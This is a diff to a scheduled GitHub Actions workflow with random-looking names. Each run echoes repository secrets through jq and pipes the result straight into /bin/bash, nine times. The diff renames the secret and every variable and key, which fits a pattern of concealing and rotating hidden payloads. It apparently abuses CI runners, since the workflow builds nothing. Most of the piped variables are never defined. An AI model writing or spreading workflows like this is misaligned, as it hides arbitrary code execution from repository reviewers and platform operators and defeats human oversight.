@@ -2,24 +2,25 @@ name: zonxxki
 on:
   workflow_dispatch:
   schedule:
-    - cron: '13 4/6 * * *'
+    - cron: '54 4/6 * * *'
 
-jobs:  # 7375
+jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: zonxxki
         env:
-          koa6: ${{ secrets.koa6 }}
+          atp750: ${{ secrets.atp750 }}
         run: |
-          echo $koa6 | jq -r .h9336 | /bin/bash
-          echo $wvsnu127 | jq -r .xdh49 | /bin/bash
-          echo $u011 | jq -r .x7714 | /bin/bash
-          echo $eatfc86712 | jq -r .vp17 | /bin/bash
-          echo $ljqmu11893 | jq -r .o1 | /bin/bash
-          echo $awfos1 | jq -r .p24355 | /bin/bash
-          echo $q3 | jq -r .al82 | /bin/bash
-          echo $faxx45 | jq -r .dzko6002 | /bin/bash
-          echo $nto95 | jq -r .qtxn64 | /bin/bash
+          echo $atp750 | jq -r .t361 | /bin/bash
+          echo $viof94 | jq -r .c993 | /bin/bash
+          echo $wzyli450 | jq -r .qxs20 | /bin/bash
+          echo $d05 | jq -r .by00 | /bin/bash
+          echo $gy1641 | jq -r .pqulr3 | /bin/bash
+          echo $l6893 | jq -r .mh56056 | /bin/bash
+          echo $kl69162 | jq -r .l6 | /bin/bash
+          echo $o04 | jq -r .gezjp69464 | /bin/bash
+          echo $avau994 | jq -r .fs3741 | /bin/bash
 
